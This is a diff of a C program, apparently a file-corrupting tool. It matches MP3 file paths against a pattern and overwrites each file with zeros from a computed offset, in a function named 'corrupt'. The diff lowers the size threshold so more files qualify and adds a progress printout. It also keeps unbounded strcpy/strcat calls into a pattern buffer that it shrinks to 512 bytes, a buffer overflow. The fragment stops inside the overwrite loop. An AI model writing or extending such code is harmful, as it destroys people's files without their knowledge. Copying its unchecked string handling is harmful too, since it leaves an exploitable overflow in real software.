@@ -37,13 +37,20 @@ BOOL fexists(const char* filename)
 	return FALSE;
 }
 
+
+int filter(const struct dirent *d)
+{ 
+	if (strcmp(d->d_name, ".") == 0 || strcmp(d->d_name, "..") == 0) return 0;
+	return 1;
+}
+
 BOOL is_filepath_target(const char* filepath, const char* prefix_pattern)
 {
 	// char* delimiter; // win or unix, if none, none will be used so chill
 	// if (strstr(filepath, "\\")) strcpy(delimiter, "\\");
 	// if (strstr(filepath, "/")) strcpy(delimiter, "/");
 
-	char pattern[1024];
+	char pattern[512];
 	strcpy(pattern, "*");
 	strcat(pattern, prefix_pattern);
 	strcat(pattern, "*.mp3");
@@ -52,14 +59,20 @@ BOOL is_filepath_target(const char* filepath, const char* prefix_pattern)
 
 	// const char* pattern = "*.mp3";
 	int res = fnmatch (&pattern, filepath, 0);
-	if (res == 0) return TRUE;
+	if (res == 0) 
+	{
+		// printf(" == '%s' is match by pattern '%s' == \n", filepath, prefix_pattern);
+		return TRUE;
+	}
 
+
+	// printf(" == '%s' is not match by pattern '%s' == \n", filepath, prefix_pattern);
 	return FALSE;
 }
 
 long int calc_start(long int size)
 {
-	long int min_size = 720;
+	long int min_size = MB/2;
 	if (size <= min_size) return -1;
 	
 	// printf("size is %ld\n", size);
@@ -76,18 +89,23 @@ long int calc_start(long int size)
 void corrupt(const char* filepath)
 {
 	if (!fexists(filepath)) return;
-	long int min_size = 721+1024*1024; // 721B + 1MB
+	long int min_size = MB/2; // 0.5 MB
 	long int size = fsizes(filepath);
 	if (size < min_size) return; // empty mp3
 
 	// long int bytes_to_read = size - min_size;
 
 	FILE* f = fopen(filepath, "r+");
-	long int start = calc_start(size);// 
+	long int start = calc_start(size);
+	if (start == -1) {
+		fclose(f);
+		return;
+	}
 	fseek(f, start, SEEK_SET); // works with r+ only ! a+ wont allow overwriting
 
 	BYTE buffer[1024]; for (int i =0; i< 1024; i++) buffer[i] = 0;
 	
+	printf("ctr %s: %ld/%ld\n", filepath, start, size);
 	while(ftell(f) < size)
 	{
 		// printf("corrupting %s: %d\n", filepath, ftell(f));
